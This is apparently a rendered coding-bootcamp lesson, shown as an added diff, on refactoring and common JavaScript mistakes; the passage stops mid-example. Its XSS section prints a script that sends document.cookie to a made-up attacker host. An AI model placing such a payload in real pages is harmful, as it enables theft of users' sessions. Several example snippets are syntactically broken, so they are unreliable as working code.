@@ -1,0 +1,601 @@
+I"R�<h1 id="refactor-tractor-the-js-edition">Refactor Tractor: The JS Edition</h1>
+
+<h2 id="learning-goals">Learning Goals</h2>
+<ul>
+  <li>Understanding the general goal of refactoring</li>
+  <li>Red, Green, Refactor Workflow</li>
+  <li>Become familiar with common mistakes and avoid bad practices in JavaScript code</li>
+</ul>
+
+<h2 id="warmup">Warmup</h2>
+<p><strong>What Is Refactoring and Why Do It?</strong></p>
+
+<p>“Refactoring is the process of changing a software system in such a way that it does not alter the external behavior of the code yet improves its internal structure.”
+– Martin Fowler from <a href="http://www.amazon.com/Refactoring-Improving-Design-Existing-Code/dp/0201485672/ref=sr_1_1?ie=UTF8&amp;qid=1452175241&amp;sr=8-1&amp;keywords=refactoring+improving">Refactoring: Improving The Design of Existing Code</a></p>
+
+<ul>
+  <li>
+    <p>Makes code clearer and easier to work on</p>
+  </li>
+  <li>
+    <p>Typically done in small steps</p>
+  </li>
+</ul>
+
+<p>Refactoring is not exactly ‘bug fixing’, not exactly ‘just rearranging code’ and almost never ‘adding features’.</p>
+
+<p><img src="http://i.imgur.com/oqKzbq1.jpg" alt="refactoring" /></p>
+
+<p>For that reason, even though this lesson is called ‘Refactor Tractor’ not everything in it is exactly refactoring. We will be covering learning to recognize common subtle bugs and code smells in JavaScript code. We will also be covering how to fix those bugs and communicating your fixes through Github.</p>
+
+<p><strong>Take a few minutes and reflect on the following questions:</strong></p>
+<ul>
+  <li>What percentage of your time coding do you feel like you spend ‘refactoring’ what you’ve written?</li>
+  <li>Books, articles or talks that help understanding writing cleaner code?</li>
+  <li>What would the difference be between ‘refactoring’ and ‘reworking’?</li>
+</ul>
+
+<h2 id="red-green-refactor">Red, Green, Refactor</h2>
+<p>‘Red &gt; Green &gt; Refactor’ is a short term used to explain the typical TDD work flow. The idea is that, when you’re test driving software development, you go through the following steps:</p>
+
+<p>Red: Think of something you want your code to do and write a test that will fail unless the code is functioning.</p>
+
+<p>Green: Write just enough code to make the test that you wrote earlier pass.</p>
+
+<p>Refactor: Now that the code works, you focus on cleaning it up. Eliminate duplication, improve the code quality.</p>
+
+<p>And repeat.</p>
+
+<p>If you’ve ever sat in front of a blank piece of paper trying to write a letter, report, poem, etc - you probably know that if you focus too hard of writing something beautiful and perfect on the first shot, the task is daunting and exhausting. However, if you allow yourself the freedom to write a second draft and go back and edit, you can feel freer to just get your thoughts out on the first pass.</p>
+
+<p>Refactoring is a lot like that, only instead of waiting for the very end to write another draft, you clean up after every paragraph or stanza.</p>
+
+<p>Regardless of whether or not a developer is working in a strictly ‘Test Driven’ way, red green refactor is an incredible useful thing to keep in mind.</p>
+
+<p>Many times when we are learning to program–either in general or just in a new language or style that we’re unfamiliar with–we tend to make broad sweeping changes to the code we’ve written or get stuck worrying that we’re not writing things correctly.</p>
+
+<p>Or we copy pasta a huge chunk of code from an example and try to make it work.</p>
+
+<p>Either way, the best way to not get overwhelmed is to follow the spirit of <code class="highlighter-rouge">red &gt; green &gt; refactor</code>.</p>
+<ul>
+  <li>Define what you want the code to do</li>
+  <li>Get the code to do what you want it to do in a measurable way (could be a test, could be manually testing) without fear of writing embarrassing code</li>
+  <li>Clean up the code that is working</li>
+</ul>
+
+<p>In a less eloquent quote than the one provided by Martin Fowler, ‘you can’t polish a turd if you don’t first have the turd’.</p>
+
+<h2 id="low-hanging-refactoring-fruit">Low Hanging Refactoring Fruit</h2>
+
+<p><strong>aka The ‘Oops I Left That In There’ Code</strong></p>
+
+<h4 id="debugger-statements"><code class="highlighter-rouge">debugger</code> statements</h4>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">debugger</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>I mean, first of all, that’s a big security issue… second of all, that’s just lazy.</p>
+
+<h4 id="commented-out-code">Commented out code.</h4>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1">//#.bind(this);</span>
+</code></pre></div></div>
+<p>Sometimes an argument for commented out code can be made when it’s there as a reminder or note to other developers. Sometimes. The above example is most likely unintentionally committed, however.</p>
+
+<h4 id="wonky-whitespace">Wonky Whitespace</h4>
+<p>Developers scan code - and mismatching or messed up whitespace is the equivalent of seeing someone with a misspelled tattoo. Doesn’t matter how good the code is, it just looks odd.</p>
+
+<h4 id="mismatched-or-too-many-semicolons-used">Mismatched or Too Many Semicolons Used</h4>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//...</span>
+<span class="nx">success</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">idea</span><span class="p">){</span>
+  <span class="nx">removeIdeaFromView</span><span class="p">(</span><span class="nx">idea</span><span class="p">)</span>
+<span class="p">},</span>
+<span class="nx">error</span><span class="p">:</span> <span class="kd">function</span><span class="p">(){</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">fail</span><span class="dl">"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>JS does not enforce the use of semicolons, so it’s possible to omit them. BUT when they are missing, the JavaScript parser automatically inserts them.</p>
+
+<p><em>This can change how your code behaves</em></p>
+
+<p>Check out this example from the <a href="http://bonsaiden.github.io/JavaScript-Garden/#core.semicolon">JavaScript Garden</a></p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nb">window</span><span class="p">,</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">function</span> <span class="nx">test</span><span class="p">(</span><span class="nx">options</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">testing!</span><span class="dl">'</span><span class="p">)</span>
+
+        <span class="p">(</span><span class="nx">options</span><span class="p">.</span><span class="nx">list</span> <span class="o">||</span> <span class="p">[]).</span><span class="nx">forEach</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="p">})</span>
+
+        <span class="nx">options</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span>
+            <span class="dl">'</span><span class="s1">long string to pass here</span><span class="dl">'</span><span class="p">,</span>
+            <span class="dl">'</span><span class="s1">and another long string to pass</span><span class="dl">'</span>
+        <span class="p">)</span>
+
+        <span class="k">return</span>
+        <span class="p">{</span>
+            <span class="na">foo</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">test</span> <span class="o">=</span> <span class="nx">test</span>
+
+<span class="p">})(</span><span class="nb">window</span><span class="p">)</span>
+
+<span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nb">window</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">someLibrary</span> <span class="o">=</span> <span class="p">{}</span>
+
+<span class="p">})(</span><span class="nb">window</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>This is how the interpreter will parse the code - which will change what the code does.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nb">window</span><span class="p">,</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">function</span> <span class="nx">test</span><span class="p">(</span><span class="nx">options</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="c1">// Not inserted, lines got merged</span>
+        <span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">testing!</span><span class="dl">'</span><span class="p">)(</span><span class="nx">options</span><span class="p">.</span><span class="nx">list</span> <span class="o">||</span> <span class="p">[]).</span><span class="nx">forEach</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="p">});</span> <span class="c1">// &lt;- inserted</span>
+
+        <span class="nx">options</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span>
+            <span class="dl">'</span><span class="s1">long string to pass here</span><span class="dl">'</span><span class="p">,</span>
+            <span class="dl">'</span><span class="s1">and another long string to pass</span><span class="dl">'</span>
+        <span class="p">);</span> <span class="c1">// &lt;- inserted</span>
+
+        <span class="k">return</span><span class="p">;</span> <span class="c1">// &lt;- inserted, breaks the return statement</span>
+        <span class="p">{</span> <span class="c1">// treated as a block</span>
+
+            <span class="c1">// a label and a single expression statement</span>
+            <span class="na">foo</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{}</span>
+        <span class="p">};</span> <span class="c1">// &lt;- inserted</span>
+    <span class="p">}</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">test</span> <span class="o">=</span> <span class="nx">test</span><span class="p">;</span> <span class="c1">// &lt;- inserted</span>
+
+<span class="c1">// The lines got merged again</span>
+<span class="p">})(</span><span class="nb">window</span><span class="p">)(</span><span class="kd">function</span><span class="p">(</span><span class="nb">window</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">someLibrary</span> <span class="o">=</span> <span class="p">{};</span> <span class="c1">// &lt;- inserted</span>
+
+<span class="p">})(</span><span class="nb">window</span><span class="p">);</span> <span class="c1">//&lt;- inserted</span>
+</code></pre></div></div>
+
+<h4 id="accidental-global-variables">Accidental Global Variables</h4>
+
+<p>Forgetting a <code class="highlighter-rouge">var</code> or <code class="highlighter-rouge">let</code>/<code class="highlighter-rouge">const</code> can cause major problems in your code.</p>
+
+<p>To review:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">cat</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">fluffy</span><span class="dl">'</span><span class="p">;</span>
+<span class="c1">// This defines a `cat` in the current scope</span>
+
+<span class="nx">snake</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">snek</span><span class="dl">'</span><span class="p">;</span>
+<span class="c1">// This defines a variable called `snake` in the global scope</span>
+</code></pre></div></div>
+
+<p>This can cause some pretty gnarly bugs. <a href="http://jsbin.com/fukuqupalo/edit?js,console">Try running the code below on jsbin</a>.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+  <span class="nx">methodThatAccidentlyCreatesAGlobalVariable</span><span class="p">();</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">methodThatAccidentlyCreatesAGlobalVariable</span><span class="p">(){</span>
+  <span class="k">for</span><span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// welp, we forgot the var statement</span>
+    <span class="c1">// ...</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The <code class="highlighter-rouge">methodThatAccidentlyCreatesAGlobalVariable()</code> creates a global <code class="highlighter-rouge">i</code> variable. The initial <code class="highlighter-rouge">for</code> loop will only run once.</p>
+
+<p><strong>Reflect</strong></p>
+<ul>
+  <li>What do you use to review code before you commit it?</li>
+  <li>What do you use to catch these basic issues?</li>
+</ul>
+
+<h2 id="more-complex-javascript-code-issues-to-look-out-for">More Complex JavaScript Code Issues to Look Out For</h2>
+
+<h4 id="uncached-jquery-selectors">Uncached jQuery Selectors</h4>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#myHeader</span><span class="dl">"</span><span class="p">).</span><span class="nx">hide</span><span class="p">();</span>
+  <span class="c1">// do some things</span>
+  <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#myHeader</span><span class="dl">"</span><span class="p">).</span><span class="nx">show</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p>In the above code, jQuery is searching the entire DOM tree to locate the <code class="highlighter-rouge">#myHeader</code> twice.</p>
+
+<p>Instead, we should consider caching - storing the reference to the object in a variable.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kd">var</span> <span class="nx">$myHeader</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="err">“#</span><span class="nx">myHeader</span><span class="err">”</span><span class="p">);</span>
+
+  <span class="nx">$myHeader</span><span class="p">.</span><span class="nx">hide</span><span class="p">();</span>
+  <span class="c1">// do some things</span>
+  <span class="nx">$myHeader</span><span class="p">.</span><span class="nx">show</span><span class="p">();</span>
+</code></pre></div></div>
+
+<h4 id="cross-site-scripting-xss-attack-vulnerability">Cross-Site Scripting (XSS) Attack Vulnerability</h4>
+<p>Cross-site Scripting is when malicious scripts are inserted into the client-side code of a web site or application. You are vulnerable to this kind of attack when you use unvalidated or unencoded user input directly in your site.</p>
+
+<p>Let’s say an attacker wants to steal your users’ cookies (I can’t believe that’s a real sentence in web development, but anyway… let’s assume)</p>
+
+<p>You could do something like that with this line of code:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
+  window.location='http://mysweethackingwebsite98736902/?cookie='+document.cookie
+&lt;/script&gt;
+</code></pre></div></div>
+
+<p>Now let’s say that in your Blogger app, you take the contents of what someone types in a comment field - store it in the database - and then show it on a page.</p>
+
+<p>Boom. Hacked.</p>
+
+<p>Another example is - maybe you have a store online. Maybe you’re selling very expensive t-shirts. Maybe you pull in information like price from the database.</p>
+
+<p>Maybe you then run a sale that takes 10% off of the price and you do your calculation in JavaScript and then change the price on the page.</p>
+
+<p>Maybe then, since you did the calculation in JavaScript, you rely on pulling in the t-shirt’s price from the DOM when someone purchases it.</p>
+
+<p>What could go wrong?</p>
+
+<p><strong>Reflect</strong></p>
+<ul>
+  <li>Did any of the above examples surprise you?</li>
+  <li>How often do you think developers make these kinds of ‘mistakes’ in production code?</li>
+  <li>How, other than memorizing flash cards, can you prevent potential bugs that you don’t know are possible?</li>
+</ul>
+
+<h2 id="student-added-content">Student Added Content</h2>
+
+<h4 id="breaking-the-law-of-demeter">Breaking the Law of Demeter</h4>
+
+<p>No, not <a href="https://en.wikipedia.org/wiki/Demeter">this Demeter</a>. (Though she is the center of one of the more interesting season myths).</p>
+
+<p>The Law of Demeter (LoD) is also known as the <strong>principle of least knowledge</strong>, which is a fancy way of saying each piece of code should be stupid. Here are some critical points:</p>
+
+<ul>
+  <li>Units of code should have limited knowledge of other code.</li>
+  <li>Stranger Danger: Code should only talk to code it knows.</li>
+</ul>
+
+<p>LoD is a critical philosophy of object-oriented programming (OOP) and requires objects to request something from another object or instance rather than accessing it directly.</p>
+
+<p>Object methods can invoke the methods of 5 types of objects:</p>
+
+<ol>
+  <li>The object itself.</li>
+  <li>The method’s parameters.</li>
+  <li>Objects instantiated within the method.</li>
+  <li>The Object’s direct components.</li>
+  <li>Global variables within scope.</li>
+</ol>
+
+<p><strong>Example of LoD Code Smell</strong></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class Invoice &lt; ActiveRecord::Base
+  belongs_to :user
+end
+
+&lt;%= @invoice.user.name %&gt;
+&lt;%= @invoice.user.address %&gt;
+&lt;%= @invoice.user.cellphone %&gt;
+</code></pre></div></div>
+
+<p><strong>Example of Refactored Code</strong></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class Invoice &lt; ActiveRecord::Base
+  belongs_to :user
+  delegate :name, :address, :cellphone, :to =&gt; :user, :prefix =&gt; true
+end
+
+&lt;%= @invoice.user_name %&gt;
+&lt;%= @invoice.user_address %&gt;
+&lt;%= @invoice.user_cellphone %&gt;
+</code></pre></div></div>
+
+<h4 id="callback-hell">Callback Hell</h4>
+
+<p>Async Javascript requires the use of Callbacks. Imagine a series of events A, B and C. If C relies on B and B relies on A, this can get problematic. Imagine the following async snippet with conditionals:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>doAsync1(function () {
+  doAsync2(function () {
+    doAsync3(function () {
+      doAsync4(function () {
+    })
+  })
+})
+
+</code></pre></div></div>
+
+<p>Ways to avoid and re-factor Callback Hell:</p>
+<ul>
+  <li><code class="highlighter-rouge">Modular approach</code> includes breaking each task into seperate functions. Instead of sprinkling anonymous functions everywhere, you can have specific functions that are re-useable. Imagine the following:</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function onProcess3(err, data) {
+  if (err) return res.status(500).send(err)
+  fs.writeFile(outputFile, data, onWriteFile)
+}
+</code></pre></div></div>
+
+<ul>
+  <li><code class="highlighter-rouge">Promises approach</code> includes using methods such as <code class="highlighter-rouge">.then</code>, <code class="highlighter-rouge">.catch</code> and other error
+handling approachs.</li>
+  <li><code class="highlighter-rouge">ES6 generators</code> includes a “Pause and Execute” approach. It is definitely worth reading the blog <a href="https://medium.com/@adamkijensen/til-es6-generators-39196f7f5283#.3xf1s11bu">here</a></li>
+  <li>Use an external library such as <a href="http://highlandjs.org/">highland.js</a> or <a href="https://github.com/caolan/async">async</a></li>
+</ul>
+
+<h4 id="single-responsibility-principle--code-that-does-too-much">Single Responsibility Principle &amp;&amp; Code That Does Too Much</h4>
+
+<p>A class or module should only have one reason to change.</p>
+
+<p>Anything that gives a class a reason to change should be considered a responsibility.</p>
+
+<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">*</span> Persistence
+<span class="p">*</span> Validation
+<span class="p">*</span> Notification
+<span class="p">*</span> Error Handling
+<span class="p">*</span> Class Selection / Instantiation
+<span class="p">*</span> Formatting
+<span class="p">*</span> Parsing
+<span class="p">*</span> Mapping
+</code></pre></div></div>
+
+<p>Code that does too much, where logic isn’t contained, can cause unintended side effects.</p>
+
+<p>It’s better to separate responsibilities so the codebase is resilient to change and easy to understand. In a sense, future-proof.</p>
+
+<p>Example:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">IncomeStatement</span><span class="p">()</span> <span class="p">{</span>
+	<span class="kd">let</span> <span class="nx">transactions</span> <span class="o">=</span> <span class="nx">transactions</span>
+<span class="p">}</span>
+
+<span class="nx">IncomeStatement</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">process_transactions</span><span class="p">()</span> <span class="p">{</span>
+  <span class="k">for</span> <span class="nx">transaction</span> <span class="k">in</span> <span class="nx">transactions</span> <span class="p">{</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">calc_revenue</span><span class="p">(</span><span class="nx">transaction</span><span class="p">)</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">IncomeStatement</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">calc_revenue</span><span class="p">(</span><span class="nx">transaction</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nx">transaction</span><span class="p">.</span><span class="nx">sale_price</span> <span class="o">-</span> <span class="nx">transaction</span><span class="p">.</span><span class="nx">cost_of_goods</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>If we change how revenue is calculated for certain transactions, by including other fixed or variable costs, the income statement class will have to change.</p>
+
+<p>Refactored:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">IncomeStatement</span><span class="p">()</span> <span class="p">{</span>
+	<span class="kd">let</span> <span class="nx">transactions</span> <span class="o">=</span> <span class="nx">transactions</span>
+<span class="p">}</span>
+
+<span class="nx">IncomeStatement</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">process_transactions</span><span class="p">()</span> <span class="p">{</span>
+  <span class="k">for</span> <span class="nx">transaction</span> <span class="k">in</span> <span class="nx">transactions</span> <span class="p">{</span>
+    <span class="nx">Revenue</span><span class="p">.</span><span class="nx">calc_revenue</span><span class="p">(</span><span class="nx">transaction</span><span class="p">)</span>
+  <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="kd">function</span> <span class="nx">Revenue</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kd">let</span> <span class="nx">gross_profit</span> <span class="o">=</span> <span class="nx">gross_profit</span>
+<span class="p">}</span>
+
+<span class="nx">Revenue</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">calc_revenue</span><span class="p">(</span><span class="nx">transaction</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nx">gross_profit</span> <span class="o">=</span> <span class="nx">transaction</span><span class="p">.</span><span class="nx">sale_price</span> <span class="o">-</span> <span class="nx">transaction</span><span class="p">.</span><span class="nx">cost_of_goods</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Now the calculation of revenue is independent of the larger income statement and can adapt to transaction specific costs.</p>
+
+<h4 id="if-if-if-else-if-else-else-if-else-">If If If Else If Else Else If Else …</h4>
+
+<p>Deeply nested if/else statements should be avoided– they make a program difficult to follow. There are many ways to refactor/restructure to avoid this condition, and good strategy can vary with the situation.</p>
+
+<h4 id="breaking-up-functions">Breaking Up Functions</h4>
+
+<p>Instead of:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nx">input</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">red</span><span class="dl">"</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">input</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">boat</span><span class="dl">"</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
+    <span class="c1">// Do the thing for red boats</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">(</span><span class="nx">input</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">train</span><span class="dl">"</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
+    <span class="c1">// Do the thing for red trains</span>
+  <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">(</span><span class="nx">input</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">blue</span><span class="dl">"</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
+  <span class="c1">// more if elses</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>You could:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">deviceActions</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="na">train</span> <span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">color</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Do something for trains based on color</span>
+  <span class="p">},</span>
+  <span class="na">boat</span> <span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">color</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Do something for boats based on color</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">inputWords</span> <span class="o">=</span> <span class="nx">input</span><span class="p">.</span><span class="nx">split</span><span class="p">();</span>
+<span class="nx">deviceActions</span><span class="p">[</span><span class="nx">inputWords</span><span class="p">[</span><span class="mi">0</span><span class="p">]](</span><span class="nx">inputWords</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</code></pre></div></div>
+
+<h4 id="use-an-object-aka-hash-aka-dictionary">Use an object (aka hash aka dictionary)</h4>
+
+<p>This was used somewhat in the previous example, but let’s take a look at the classic fizzbuzz, or as exercism.io implements it, <a href="http://exercism.io/exercises/javascript/raindrops/readme">raindrops</a>. The gist of the problem is to output different words based on whether an integer is divisible by 3, 5, 7, or any combination thereof.</p>
+
+<p>One method would be out-of-control if/elses something like:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span><span class="p">(</span><span class="nx">n</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">n</span> <span class="o">%</span> <span class="mi">5</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span><span class="p">(</span><span class="nx">n</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="dl">"</span><span class="s2">plingplangplong</span><span class="dl">"</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">n</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="dl">"</span><span class="s2">plingplong</span><span class="dl">"</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="dl">"</span><span class="s2">pling</span><span class="dl">"</span>
+    <span class="p">}</span>
+  <span class="p">}</span> <span class="c1">// much more code ...</span>
+</code></pre></div></div>
+
+<p>Have you written a raindrops/fizzbuzz solution that looked like this? No judgement! Most people in the world do not have the patience, logical aptitude, or what have you, to sit down and make something like this work. So give yourself a nice back pat.</p>
+
+<p>Another way to do this would be to see that we could just check once for each factor, appending to a result string:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+
+  <span class="k">if</span><span class="p">(</span><span class="nx">n</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">result</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">pling</span><span class="dl">"</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">if</span><span class="p">(</span><span class="nx">n</span> <span class="o">%</span> <span class="mi">5</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">result</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">plang</span><span class="dl">"</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">if</span><span class="p">(</span><span class="nx">n</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">result</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">plong</span><span class="dl">"</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Not looking too bad. Sometimes it’s about taking a step back and thinking about what really needs to be done instead of getting right into the if/else weeds. Or, you can shamelessly write the if/elses to get the job done, then take a look at it and see if there are any patterns that could make the code cleaner.</p>
+
+<p>For this example, the three isolated <code class="highlighter-rouge">if</code>s with the trick of appending a single result might be a good stopping place. But sometimes it’s more complex, which is where the hash pairs come in:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">factors</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">factorMap</span><span class="p">);</span>
+
+  <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">factors</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">factor</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">factors</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">n</span> <span class="o">%</span> <span class="nx">factor</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">result</span> <span class="o">=</span> <span class="nx">result</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nx">factorMap</span><span class="p">[</span><span class="nx">factor</span><span class="p">]);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+
+  <span class="kd">var</span> <span class="nx">factorMap</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="mi">3</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">Pling</span><span class="dl">"</span><span class="p">,</span>
